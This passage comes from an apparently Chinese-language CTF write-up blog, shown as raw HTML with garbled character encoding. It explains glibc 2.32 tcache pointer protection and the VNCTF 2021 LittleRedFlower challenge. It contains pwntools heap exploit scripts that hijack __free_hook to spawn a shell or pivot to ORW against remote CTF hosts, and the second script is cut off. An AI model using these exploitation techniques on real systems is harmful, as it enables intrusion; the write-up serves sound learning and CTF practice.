class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">hit = [<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;\x10&#x27;</span>, <span class="string">b&#x27;\x20&#x27;</span>, <span class="string">b&#x27;\x30&#x27;</span>, <span class="string">b&#x27;\x40&#x27;</span>, <span class="string">b&#x27;\x50&#x27;</span>, <span class="string">b&#x27;\x60&#x27;</span>, <span class="string">b&#x27;\x70&#x27;</span>, <span class="string">b&#x27;\x80&#x27;</span>, <span class="string">b&#x27;\x90&#x27;</span>, <span class="string">b&#x27;\xa0&#x27;</span>, <span class="string">b&#x27;\xb0&#x27;</span>, <span class="string">b&#x27;\xc0&#x27;</span>, <span class="string">b&#x27;\xd0&#x27;</span>, <span class="string">b&#x27;\xe0&#x27;</span>, <span class="string">b&#x27;\xf0&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">hit_byte</span>):</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    edit(<span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    free()</span><br><span class="line">    </span><br><span class="line">    edit(<span class="string">b&#x27;\x10&#x27;</span> + hit_byte)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * (<span class="number">0xe</span> + <span class="number">0x10</span> + <span class="number">9</span>) + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    show()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;[+] libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x01\x00&#x27;</span> * <span class="number">2</span>).ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    new(<span class="number">0x40</span>, (<span class="string">b&#x27;\x01\x00&#x27;</span> * <span class="number">2</span>).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    count = <span class="number">1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the no.&#x27;</span> + <span class="built_in">str</span>(count) + <span class="string">&#x27;try&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&#x27;try: &#x27;</span> + hit[i])</span><br><span class="line">            p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26454</span>)<span class="comment">#process(&#x27;./ff&#x27;)#</span></span><br><span class="line">            exp(hit[i])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            i = i % <span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1&#x2F;16 çš„å‡ ç‡ï¼Œæœ¬åœ°å¾ˆå¿«å°±é€šäº†ï¼Œä½†æ˜¯æ‰“è¿œç¨‹ä¸€ç›´çˆ†ç ´ä¸å‡ºæ¥ï¼Œå‡ºç°äº†ä¸¤ç§æŠ¥é”™ä¿¡æ¯ï¼š</p>
<ul>
<li><p><code>malloc(): unaligned tcache chunk detected</code></p>
</li>
<li><p><code>free(): invalid pointer</code></p>
</li>
</ul>
<p>å‡ºç°è¿™ä¸¤ç§æŠ¥é”™ä¿¡æ¯çš„åŸå› éƒ½æ˜¯ <strong>å †å—æŒ‡é’ˆæœªå¯¹é½</strong> ï¼Œç¬”è€…ç™¾æ€ä¸å¾—å…¶è§£ï¼Œåªå¥½å°†libc2.32çš„æºç ä¸‹è½½ä¸‹æ¥çœ‹çœ‹â€¦</p>
<h4 id="glibc-2-31ä¸‹çš„-tcache-put-ä¸-tcache-get"><a href="#glibc-2-31ä¸‹çš„-tcache-put-ä¸-tcache-get" class="headerlink" title="glibc 2.31ä¸‹çš„ tcache_put ä¸ tcache_get"></a>glibc 2.31ä¸‹çš„ tcache_put ä¸ tcache_get</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹åœ¨ <code>glibc 2.31</code> ä¸­æ˜¯å¦‚ä½•æ“ä½œ tcache ä¸­çš„å †å—çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ <code>glibc2.31</code> ä¸‹ï¼Œå †ç®¡ç†å™¨åœ¨ <code>å–/æ”¾</code> chunkæ—¶ä¸ä¼šæ£€æµ‹ tcache ä¸­çš„å †å—åœ°å€çš„åˆæ³•æ€§ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•çš„è¯¸å¦‚ <code>åŠ å¯†/è§£å¯†</code> ç­‰ä¸€ç³»åˆ—çš„é˜²æŠ¤æ‰‹æ®µï¼Œå®Œå…¨å°±æ˜¯ä¸€ä¸ªè£¸çš„å•å‘é“¾è¡¨ç»“æ„ï¼Œåˆ©ç”¨èµ·æ¥æ˜“å¦‚åæŒï¼Œåªéœ€è¦ä¸€ä¸ªè¯¸å¦‚ <code>UAF</code> ä¹‹ç±»çš„æ¼æ´å°±å¯ä»¥ç›´æ¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<h4 id="glibc-2-32ä¸‹çš„-tcache-put-ä¸-tcache-get"><a href="#glibc-2-32ä¸‹çš„-tcache-put-ä¸-tcache-get" class="headerlink" title="glibc 2.32ä¸‹çš„ tcache_put ä¸ tcache_get"></a>glibc 2.32ä¸‹çš„ tcache_put ä¸ tcache_get</h4><p>ä½†æ˜¯åœ¨ <code>glibc 2.32</code> ä¸­å¼•å…¥äº†ä¸€ä¸ªç®€å•çš„å¼‚æˆ–åŠ å¯†æœºåˆ¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€ã€æ–°å¢äº†åœ¨ä» tcache ä¸­å–å‡º chunk æ—¶ä¼šæ£€æµ‹ chunk åœ°å€æ˜¯å¦å¯¹é½çš„ä¿æŠ¤</p>
<p>äºŒã€å¼•å…¥äº†ä¸¤ä¸ªæ–°çš„å®å¯¹ tcache ä¸­<code>å­˜/å–</code> chunk çš„æ“ä½œè¿›è¡Œäº†ä¸€å±‚ä¿æŠ¤ï¼Œå³åœ¨ new chunk é“¾æ¥ tcache ä¸­ old chunk æ—¶ä¼šè¿›è¡Œä¸€æ¬¡å¼‚æˆ–è¿ç®—ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>å³ <strong>tcache_entry-&gt;nextä¸­å­˜æ”¾çš„chunkåœ°å€ä¸ºä¸è‡ªèº«åœ°å€è¿›è¡Œå¼‚æˆ–è¿ç®—åæ‰€å¾—åˆ°çš„å€¼</strong>ï¼Œ è¿™å°±è¦æ±‚æˆ‘ä»¬åœ¨åˆ©ç”¨ tcache_entry è¿›è¡Œä»»æ„åœ°å€å†™ä¹‹å‰ <strong>éœ€è¦æˆ‘ä»¬æå‰æ³„æ¼å‡ºç›¸åº” chunk çš„åœ°å€ï¼Œå³æˆ‘ä»¬éœ€è¦æå‰è·å¾—å †åŸºå€åæ‰èƒ½è¿›è¡Œä»»æ„åœ°å€å†™</strong>ï¼Œè¿™ç»™ä¼ ç»Ÿçš„åˆ©ç”¨æ–¹å¼æ— ç–‘æ˜¯å¢åŠ äº†ä¸å°‘çš„éš¾åº¦</p>
<p>ä¸è¿‡è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥æ§åˆ¶ <code>tcache struct</code>ï¼Œåˆ™ä»ç„¶å¯ä»¥ç›´æ¥è¿›è¡Œä»»æ„åœ°å€å†™ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ tcache struct ä¸­å­˜æ”¾çš„ä»æ˜¯æœªç»å¼‚æˆ–è¿ç®—çš„åŸå§‹ chunk åœ°å€</p>
<h4 id="glibc2-32ä¸‹å †åŸºå€çš„æ–°æ³„éœ²æ–¹å¼"><a href="#glibc2-32ä¸‹å †åŸºå€çš„æ–°æ³„éœ²æ–¹å¼" class="headerlink" title="glibc2.32ä¸‹å †åŸºå€çš„æ–°æ³„éœ²æ–¹å¼"></a>glibc2.32ä¸‹å †åŸºå€çš„æ–°æ³„éœ²æ–¹å¼</h4><p>è™½ç„¶è¿™ç§ç®€å•çš„å¼‚æˆ–åŠ å¯†æ–¹å¼ç»™ tcache æé«˜äº†ä¸å°‘çš„å®‰å…¨ç³»æ•°ï¼Œä½†æ˜¯åŒæ ·ä¹Ÿæä¾›ç»™æˆ‘ä»¬æ–°çš„æ³„éœ²å †åŸºå€çš„é€”å¾„</p>
<p>æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°ï¼Œåœ¨ tcache çš„ä¸€ä¸ª entry ä¸­æ”¾å…¥ç¬¬ä¸€ä¸ª chunk æ—¶ï¼Œå…¶åŒæ ·ä¼šå¯¹è¯¥ entry ä¸­çš„ â€œchunkâ€ ï¼ˆNULLï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—åå†™å…¥åˆ°å°†æ”¾å…¥ tcache ä¸­çš„ chunk çš„ <code>fd</code> å­—æ®µï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ‰“å°è¯¥ free chunk çš„fdå­—æ®µï¼Œ<strong>ä¾¿èƒ½å¤Ÿç›´æ¥è·å¾—æœªç»å¼‚æˆ–è¿ç®—çš„å †ä¸Šç›¸å…³åœ°å€</strong></p>
<p><img src="https://i.loli.net/2021/03/28/cYVZeEbOkf17xhP.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/28/AQ1P4EeuXRCOyGo.png" alt="image.png"></p>
<h4 id="whatâ€™s-more"><a href="#whatâ€™s-more" class="headerlink" title="whatâ€™s more?"></a>whatâ€™s more?</h4><p>åœ¨ <code>fastbin</code> ä¸­ä¼¼ä¹ä¹Ÿå¼•å…¥äº†è¿™ä¸ªæœºåˆ¶ï¼Œä½†æ˜¯åœ¨æ™®é€šçš„ <code>bins</code> æ•°ç»„ä¸­ä¼¼ä¹å¹¶æœªå¼•å…¥è¿™ä¸ªæœºåˆ¶â€¦ï¼Ÿï¼ˆç ”ç©¶ing</p>
</blockquote>
<h2 id="VNCTF-2021-hh"><a href="#VNCTF-2021-hh" class="headerlink" title="[VNCTF 2021]hh"></a>[VNCTF 2021]hh</h2><h2 id="VNCTF-2021-LittleRedFlower-stackoverflow-orw"><a href="#VNCTF-2021-LittleRedFlower-stackoverflow-orw" class="headerlink" title="[VNCTF 2021]LittleRedFlower - stackoverflow + orw"></a>[VNCTF 2021]LittleRedFlower - stackoverflow + orw</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2021/04/05/FTbyp5QsMAruaG1.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å¼€å¤´ ptctl é™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œåº”è¯¥æ˜¯åªèƒ½ orw äº†ï¼ŒåŒæ—¶è¿˜ç™½ç»™äº† libc åŸºå€</p>
<p><img src="https://i.loli.net/2021/04/05/JoDKl7kbt14Tzua.png" alt="image.png"></p>
<p>å¯ä»¥å¾€ä»»æ„åœ°å€å†™1å­—èŠ‚</p>
<p><img src="https://i.loli.net/2021/04/05/QXBCzwGuc51M7HA.png" alt="image.png"></p>
<p>æ¥ä¸‹æ¥æ˜¯å…è®¸åœ¨é¢„å…ˆåˆ†é…çš„ä¸€ä¸ª 0x200 çš„ chunk çš„ä»»æ„åç§»å¤„å†™ 8 å­—èŠ‚</p>
<p><img src="https://i.loli.net/2021/04/05/inCTA5SpRfIb9XM.png" alt="image.png"></p>
<p>æœ€åæ˜¯å…è®¸åˆ†é…ä¸€ä¸ªç‰¹å®šå¤§å°çš„ chunk ï¼Œå‘å…¶å†™å…¥å†…å®¹åè¯¥ chunk ä¼šè¢«é‡Šæ”¾ï¼Œç¨‹åºæ‰§è¡Œæµç»“æŸ</p>
<p><img src="https://i.loli.net/2021/04/05/IGWd6i1NlSeCT5n.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ°æœ€å¼€å§‹çš„ chunk ä¸ tcache struct æ˜¯ç´§æŒ¨ç€çš„ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæƒ³åŠæ³• â€œè®©è¿™ä¸ª chunk çš„ç‰¹å®šåç§»å¤„æˆä¸º tcache struct çš„ä¸€éƒ¨åˆ†â€ ï¼Œé‚£ä¹ˆåœ¨è¯¥åç§»çš„ä½ç½®å†™ 8 å­—èŠ‚æ—¶ä¾¿ç­‰åŒäºæˆ‘ä»¬å‘ tcache struct å†…æ”¾å…¥äº†ä¸€ä¸ª fake chunkï¼Œæ¥ä¸‹æ¥çš„åˆ†é…å°±èƒ½å¤Ÿå®Œæˆä»»æ„åœ°å€å†™äº†</p>
<p>é˜…è¯» glibc æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° tcache å– chunk çš„é€»è¾‘æ˜¯ä»¥ <code>mp_.tcache_bins</code> ä½œä¸ºç´¢å¼•çš„ä¸Šé™ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>è€Œç»“æ„ä½“ <code>mp_</code> ä¸ºé™æ€å˜é‡ï¼Œæ¯«æ— ç–‘é—®ä½äº libc å½“ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åªéœ€è¦åœ¨å¼€å¤´çš„ä»»æ„åœ°å€å†™ 1 å­—èŠ‚æ—¶ä¿®æ”¹ <code>mp_tcache_bins</code> å³å¯æ‰©å¤§ tcache ç´¢å¼•ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯åŠ«æŒ <code>__free_hook</code> è¿›è¡Œ orw çš„å¸¸è§„æµç¨‹</p>
<p>å¯»æ‰¾ <code>mp_</code> çš„åç§»å¯ä»¥é€šè¿‡é€†å‘ libc çš„æ–¹å¼å®Œæˆï¼š</p>
<p><img src="https://i.loli.net/2021/04/05/YbqHUBrRL76y8dK.png" alt="image.png"></p>
<p>å¯ä»¥ä½¿ç”¨é€šç”¨ gadget + setcontext å®Œæˆæ ˆè¿ç§»çš„è¿‡ç¨‹</p>
<p><img src="https://i.loli.net/2021/04/05/MkvaUCY8Ww1lXB6.png" alt="image.png"></p>
<p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29644</span>) <span class="comment">#process(&#x27;./pwn&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;GIFT: &quot;</span>)</span><br><span class="line">    stdout_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;stdout addr leak: &#x27;</span> + <span class="built_in">hex</span>(stdout_addr))</span><br><span class="line">    libc_base = stdout_addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">8</span></span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    